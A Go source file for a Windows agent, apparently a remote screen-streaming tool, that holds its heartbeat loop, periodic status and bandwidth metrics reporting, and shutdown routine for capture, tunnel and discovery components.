//go:build windows

package main

import (
	"encoding/json"
	"time"
)

func (a *Agent) SetFPS(fps float64) {
	if a.captureLoop != nil {
		a.captureLoop.SetFPS(fps)
	}
}

func (a *Agent) heartbeatLoop() {
	t := time.NewTicker(HEARTBEAT_INTERVAL)
	defer t.Stop()
	for {
		select {
		case <-a.ctx.Done():
			return
		case <-t.C:
			if t := a.pool.GetBest(); t != nil {
				_ = t.Send(&WireMessage{Type: MSG_HEARTBEAT, Data: []byte(`{"type":"ping"}`)})
			}
		}
	}
}

func (a *Agent) metricsLoop() {
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	startTime := time.Now()
	for {
		select {
		case <-a.ctx.Done():
			return
		case <-t.C:
			if a.frameCh == nil {
				continue
			}
			status := map[string]interface{}{
				"type":              "status",
				"agentId":           a.id,
				"current_fps":       float64(a.captureLoop.fps.Load()) / 100.0,
				"current_quality":   a.encoder.quality,
				"bytes_sent_mb":     0.0,
				"frames_dropped":    0,
				"uptime":            time.Since(startTime).Seconds(),
			}
			if a.bandwidth != nil {
				status["bandwidth_used_mb"] = a.bandwidth.GetUsedMB()
				status["bandwidth_limit_mb"] = float64(a.bandwidth.GetLimitMB())
				status["current_bandwidth_kbps"] = a.bandwidth.GetCurrentRateKBps()
			}
			data, _ := json.Marshal(status)
			select {
			case a.frameCh <- &WireMessage{Type: MSG_REPORT, Data: data}:
			default:
			}
		}
	}
}

func (a *Agent) Shutdown() {
	a.cancel()
	if a.captureLoop != nil {
		a.captureLoop.Stop()
	}
	if a.idleDetect != nil {
		a.idleDetect.Stop()
	}
	if a.tunnelMgr != nil {
		a.tunnelMgr.Stop()
	}
	if a.githubChecker != nil {
		a.githubChecker.Stop()
	}
	if a.dnsChecker != nil {
		a.dnsChecker.Stop()
	}
	if a.landiscovery != nil {
		a.landiscovery.Stop()
	}
	select {
	case <-a.done:
	default:
		close(a.done)
	}
}

